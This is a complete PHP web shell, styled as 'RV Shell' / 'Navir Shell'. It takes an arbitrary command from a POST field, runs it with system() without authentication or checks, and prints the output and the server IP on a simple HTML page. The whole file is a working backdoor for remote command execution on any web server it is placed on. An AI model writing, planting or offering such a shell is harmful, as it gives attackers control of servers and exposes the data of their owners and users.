<?php
/// Command Excution
$command = @$_POST['cm'];

// End Command Excution
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <title>RV Shell</title>
	<style>
		textarea{

			background-color:black;
			color:white;
		}
		body{
			background-color:black;

		}
		.ip{

			position:absolute;
			right:20px;
			top:-7px;

		}
		.btn{
			font-weight:bold;

		}
		.command{

			color:white;
		}
		.ip{

			color:white;
		}
    .title{
      text-align: center;
      padding:10px;
      font-weight: bold;
      color:red;

    }
	</style>
</head>
<body>
    <p class="title"># Navir Shell #</p>
    <center>
        <form action="<?php $_SERVER['PHP_SELF']?>" method="post">
            <span class="command">./Command</span> <input type="text" name="cm" placeholder="Your Command" required="required"/></br>
            <p class="ip"><b>Your IP:<?php echo gethostbyname(gethostname())?><b></p>
                    <label>Resualt</label><br/>
                    <textarea rows="20" cols="90" readonly><?php echo @system($command); ?></textarea><br/>
            <input class="btn" type="submit" value="Excute"/>
        </form>
    </center>
</body>
</html>
